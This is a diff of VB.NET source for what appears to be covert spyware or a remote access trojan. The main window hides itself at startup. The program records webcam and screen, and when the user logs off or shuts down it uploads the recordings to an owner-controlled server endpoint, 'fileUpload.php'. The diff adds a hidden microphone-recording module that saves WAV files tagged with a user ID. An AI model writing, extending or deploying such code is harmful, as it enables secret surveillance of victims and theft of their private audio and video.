@@ -3,11 +3,53 @@ Imports System.Drawing.Imaging
 Imports System.Runtime.Serialization.Formatters.Binary
 Imports System.IO
 Public Class Main
-    Dim DATOS As IDataObject
-    Dim IMAGEN As Image
     Dim isWebCamActive As Boolean = False
     Dim isWebCamRecording As Boolean = False
     Dim isScreenRecording As Boolean = False
+    Dim isMicRecording As Boolean = False
+
+    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Me.Hide()
+        CheckForIllegalCrossThreadCalls = False
+        parameters = Command()
+        StartUp.Init()
+        ReadParameters(parameters)
+        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
+    End Sub
+    Sub UploadFileToServer(ByVal filePath As String)
+        Try
+            If filePath.ToLower = "null" Or filePath = Nothing Then
+            Else
+                My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
+                End
+            End If
+        Catch ex As Exception
+            AddToLog("UploadFileToServer@Main", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
+        Try
+            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
+                AddToLog("SessionEvent", "User is logging off!", True)
+            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
+                AddToLog("SessionEvent", "System is shutting down!", True)
+            Else
+                AddToLog("SessionEvent", "Something happend!", True)
+            End If
+            If isWebCamRecording Then
+                UploadFileToServer(StopCamRecord())
+            End If
+            If isScreenRecording Then
+                UploadFileToServer(SaveScreenRecord())
+            End If
+        Catch ex As Exception
+            AddToLog("SessionEvent@Init", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+
+#Region "WebCam Service"
+    Dim DATOS As IDataObject
+    Dim IMAGEN As Image
     Public Const WM_CAP As Short = &H400S
     Public Const WM_CAP_DLG_VIDEOFORMAT As Integer = WM_CAP + 41
     Public Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
@@ -74,47 +116,6 @@ Public Class Main
             End
         End Try
     End Sub
-
-    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        Me.Hide()
-        CheckForIllegalCrossThreadCalls = False
-        parameters = Command()
-        StartUp.Init()
-        ReadParameters(parameters)
-        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
-    End Sub
-    Sub UploadFileToServer(ByVal filePath As String)
-        Try
-            If filePath.ToLower = "null" Or filePath = Nothing Then
-            Else
-                My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
-                End
-            End If
-        Catch ex As Exception
-            AddToLog("UploadFileToServer@Main", "Error: " & ex.Message, True)
-        End Try
-    End Sub
-    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
-        Try
-            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
-                AddToLog("SessionEvent", "User is logging off!", True)
-            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
-                AddToLog("SessionEvent", "System is shutting down!", True)
-            Else
-                AddToLog("SessionEvent", "Something happend!", True)
-            End If
-            If isWebCamRecording Then
-                UploadFileToServer(StopCamRecord())
-            End If
-            If isScreenRecording Then
-                UploadFileToServer(SaveScreenRecord())
-            End If
-        Catch ex As Exception
-            AddToLog("SessionEvent@Init", "Error: " & ex.Message, True)
-        End Try
-    End Sub
-
-#Region "WebCam Service"
     Function TakeCamPicture() As String
         Try
             StartCamPreview()
@@ -273,6 +274,56 @@ Public Class Main
             AddToLog("ScreenRecorder@Main", "Error: " & ex.Message, True)
         End Try
     End Sub
+#End Region
+
+#Region "Mic Service"
+    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String,
+                                                                                   ByVal lpstrReturnString As String,
+                                                                                   ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
+    Sub StartMicRecord()
+        Try
+            If Not isMicRecording Then
+                Dim BITS As Integer = 16
+                Dim CANALES As Integer = 2
+                Dim MUESTRAS As Integer = 44100
+                Dim PROMEDIO As Integer = BITS * CANALES * MUESTRAS / 8
+                Dim ALINEACION As Integer = BITS * CANALES / 8
+                Dim COMANDO As String
+                COMANDO = "set capture bitspersample " & BITS & " channels " & CANALES & " alignment " & ALINEACION & " samplespersec " &
+                MUESTRAS & " bytespersec " & PROMEDIO & " format tag pcm wait"
+                mciSendString("close capture", "", 0, 0)
+                mciSendString("open new type waveaudio alias capture", "", 0, 0)
+                mciSendString(COMANDO, "", 0, 0)
+                mciSendString("record capture", "", 0, 0)
+                isMicRecording = True
+            End If
+        Catch ex As Exception
+            AddToLog("StartMicRecord@Main", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub StopMicRecord(Optional ByVal close As Boolean = False)
+        Try
+            If Not close Then
+                mciSendString("stop capture", "", 0, 0)
+            Else
+                mciSendString("close capture", "", 0, 0)
+            End If
+        Catch ex As Exception
+            AddToLog("StopMicRecord@Main", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Function SaveMicRecord() As String
+        Try
+            StopMicRecord()
+            Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_MicRecord.wav"
+            mciSendString("save capture " & filePath, "", 0, 0)
+            StopMicRecord(True)
+            Return filePath
+        Catch ex As Exception
+            AddToLog("SaveMicRecord@Main", "Error: " & ex.Message, True)
+            Return "null"
+        End Try
+    End Function
 #End Region
 End Class
 Public Class Avi
